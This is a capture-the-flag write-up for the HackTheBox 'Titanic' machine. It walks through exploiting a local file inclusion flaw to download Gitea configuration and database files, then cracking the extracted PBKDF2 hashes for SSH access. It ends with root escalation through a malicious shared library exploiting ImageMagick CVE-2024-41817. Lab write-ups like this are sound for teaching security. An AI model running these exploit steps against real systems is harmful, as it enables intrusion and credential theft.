---
title: Titanic
date: 2025-06-27
description: Writeup for the "Titanic" machine on HackTheBox. It involves exploiting LFI to discover sensitive Gitea configuration and database files, cracking PBKDF2 hashes for SSH access, and escalating privileges via a shared library injection in ImageMagick (CVE-2024-41817).
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
  - htb-titanic
  - ctf
  - lfi
  - gitea
  - pbkdf2
  - sqlite
  - hashcat
  - ssh
  - imagick
  - cve-2024-41817
  - privilege-escalation
categories:
  - HackTheBox
  - HackTheBox/Linux
image: images/0day/banner.jpeg
---

# Titanic

| Title       | [Titanic](https://app.hackthebox.com/machines/Titanic)                                                                                                                                                                                                                     |
| ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Description | Writeup for the "Titanic" machine on HackTheBox. It involves exploiting LFI to discover sensitive Gitea configuration and database files, cracking PBKDF2 hashes for SSH access, and escalating privileges via a shared library injection in ImageMagick (CVE-2024-41817). |
| Difficulty  | Easy                                                                                                                                                                                                                                                                       |
| Maker       | [ruycr4ft](https://app.hackthebox.com/users/1253217)                                                                                                                                                                                                                       |

## Enumeration

### Nmap

```bash
# Nmap 7.95 scan initiated Thu Jun 19 16:00:52 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.11.55
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Titanic - Book Your Ship Trip
|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 19 16:01:15 2025 -- 1 IP address (1 host up) scanned in 22.26 seconds
```

We can see there are 2 ports open. 22 and 80, let's see what we can get on port 80.
![[Pasted image 20250619160313.png]]
There is nothing on homepage except this form for booking. When I tried to book, it downloaded json file with the data. Let's open it in burpsuite to see what is going on behind the scenes!
So basically there are 2 requests going on in the backend, the first one is post request where it is redirecting us to download ticket page.
![[Pasted image 20250620115006.png]]
Second is where the ticket is getting downloaded.
![[Pasted image 20250620115057.png]]
Now, just out of curiosity and as the parameter is download a file from json, let's try to read `/etc/passwd` file.
![[Pasted image 20250620115154.png]]
So there is an LFI! But after enumerating to certain path, I cannot be able to find anything useful. So I have tried to look for subdomains.

### Subdomain Enumeration

```
└─$ ffuf -H "Host: FUZZ.titanic.htb" -u http://titanic.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 20

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 35ms]
```

Found one subdomain `dev` and added it to `/etc/hosts`. On visiting the subdomain we can see it's `Gitea` page.
![[Pasted image 20250620120115.png]]
There are 2 repositories - the `flask-app` contains the source code of the app, and `docker-config` contains the `docker-compose` files. In mysql folder, password is getting exposed `MySQLP@$$w0rd!`.

```yaml
version: "3.8"

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: "MySQLP@$$w0rd!"
      MYSQL_DATABASE: tickets
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

But there is no such user when we check `/etc/passwd` from LFI earlier. But if we see the `Gitea` website at `dev` subdomain, we can see the account name is `developer`. So I have tried to login with that username and the mysql password into ssh but that didn't work.
Moreover, in the footer it says `Powered by Gitea Version: 1.22.1` but I don't think there is any vulnerability with that version that will help us to get the shell.
If we look at that other `docker-compose.yaml` file,

```yaml
version: "3"

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22" # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

then we can see the volume is at `/home/developer/gitea/data`. So after googling I found that there is an `app.ini` file located at `/conf/app.ini` in gitea folder. So the path will be

- `/home/developer/gitea/data/gitea/conf/app.ini`
  ![[Pasted image 20250620145725.png]]
  From the response, we got the database path (`/data/gitea/gitea.db`), let's try to get what's in `db`. But as per the volume mentioned above, it will be at `/home/developer/gitea/data/gitea/gitea.db`.
  Download the file using `wget`: `wget 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -O gitea.db`

## User Flag

### Exploring Gitea Database

```sqlite
> sqlite3 gitea.db
to open the database

> .tables
to list all the tables

> sqlite> select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
3|ariti|ariti||ariti@ariti.com|0|enabled|36c72ab42c6dcb1d3be7804adc51e39139e96d7d108de666514169b9ec98724ca8210476cdee15e9326b7c8eda55dce00c15|pbkdf2$50000$50|0|0|0||0|||915fa2dbfd541a543b86bc5e91ac41d7|b669965b11d556a94ac70f66501e497f|en-US||1750427942|1750427942|1750427942|0|-1|1|0|0|0|0|1|0|35ccf5eb8e540c4af76b9cd5150b5966|ariti@ariti.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
```

If we open it in sqlite DB Browser, it will look something like this,
![[Pasted image 20250620150642.png]]
I found this amazing technique from [0xdf](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash) that will make our life easier in cracking PBKDF2 hashes. Here are the steps we will follow to get the password.

- get all the hashes: `sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes`
- crack using hashcat: `hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user`
- get cracked hashes: `hashcat gitea.hashes --show --user`

```
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
ariti:sha256:50000:tmmWWxHVVqlKxw9mUB5Jfw==:NscqtCxtyx0754BK3FHjkTnpbX0QjeZmUUFpueyYckyoIQR2ze4V6TJrfI7aVdzgDBU=:123456789
```

| User      | Password  |
| --------- | --------- |
| developer | 25282528  |
| ariti     | 123456789 |

Let's try to get into developer using the creds.

```bash
developer@titanic:~$ cat user.txt
798ada2be2e573f219fcf4cc25069fb3
```

> User Flag: `798ada2be2e573f219fcf4cc25069fb3`

## Root Flag

The first step is to run `linpeas` and hoping we will get something useful from the script. I didn't found anything useful from the script. Although there were some things but it didn't lead to privilege escalation. But there is something in `/opt`.
![[Pasted image 20250620152734.png]]
There are 3 folders.

- `app` -> contains the source code of website
- `containerd` -> permission deined
- `scripts` -> There is a script inside it which is using `magick`. So let's check the version of the binary.

```bash
developer@titanic:/opt/scripts$ cat identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Version of `magick`

```bash
developer@titanic:/opt/scripts$ /usr/bin/magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

There is a CVE associated with it https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8 (CVE-2024-41817).

In order to get our flag, let's try to follow similar steps form POC.

1. We will try to create `libxcb.so.1` in `/opt/app/static/assets/images`.

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/ans.txt");
    exit(0);
}
EOF
```

![[Pasted image 20250620154914.png]] 2. So from the script, we will read the root flag and then store in in tmp folder with `ans.txt`.
![[Pasted image 20250620155045.png]]

> Root Flag: `fa8ffe301f744d288b1ab346d4baeb7c`
